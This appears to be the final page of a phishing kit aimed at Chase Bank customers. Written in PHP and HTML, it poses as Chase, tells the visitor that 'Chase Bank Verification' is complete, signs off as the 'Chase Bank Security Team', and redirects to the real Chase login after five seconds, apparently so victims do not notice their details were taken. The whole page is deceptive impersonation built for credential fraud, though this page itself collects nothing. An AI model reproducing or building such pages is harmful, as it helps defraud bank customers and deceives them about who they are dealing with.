<?php
error_reporting(0);
session_start();
include "css/login.css";
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Chase Online - Congratulations</title>
<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
<meta http-equiv="refresh" content="5; URL=https://chaseonline.chase.com/">
<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="css/Untitled1.css" rel="stylesheet">
<link href="css/fin.css" rel="stylesheet">
</head>
<body>
<div id="wb_Form1" style="position:absolute;left:68px;top:120px;width:1192px;height:161px;z-index:2;">
<form name="Form1" method="post" action="mailto:yourname@yourdomain.com" enctype="text/plain" id="Form1">
<div id="wb_Text1" style="position:absolute;left:80px;top:13px;width:250px;height:29px;z-index:0;text-align:left;">
<span style="color:#696969;font-family:Arial;font-size:24px;"><strong>Congratulations </strong></span><span style="color:#696969;font-family:Arial;font-size:20px;"><strong>!</strong></span></div>
</form>
</div>
<div id="wb_Form2" style="position:absolute;left:139px;top:243px;width:1041px;height:333px;z-index:3;">
<form name="Form2" method="post" action="mailto:yourname@yourdomain.com" enctype="text/plain" id="Form2">
</form>
</div>
<div id="wb_Form3" style="position:absolute;left:148px;top:188px;width:1041px;height:249px;z-index:4;">
<form name="Form2" method="post" action="mailto:yourname@yourdomain.com" enctype="text/plain" id="Form3">
<div id="wb_Text2" style="position:absolute;left:25px;top:31px;width:930px;height:149px;z-index:1;text-align:left;">
<span style="color:#FF0000;font-family:Arial;font-size:20px;"><strong>Chase Bank Verification</strong></span><span style="color:#000000;font-family:Arial;font-size:20px;"><strong><br></strong></span><span style="color:#696969;font-family:Arial;font-size:17px;"><strong>verification complete !<br></strong></span><span style="color:#000000;font-family:Arial;font-size:15px;"><br><strong>Note </strong>: You may now use your account as usual .You will be redirected to our main login page in few moments<br><br>We are sorry for the inconvenience that this might have caused you . We will update your account within the next 24 hours <br><br></span><span style="color:#696969;font-family:Arial;font-size:15px;"><strong>Chase Bank Security Team</strong></span></div>
</form>
</div>
</body>
</html>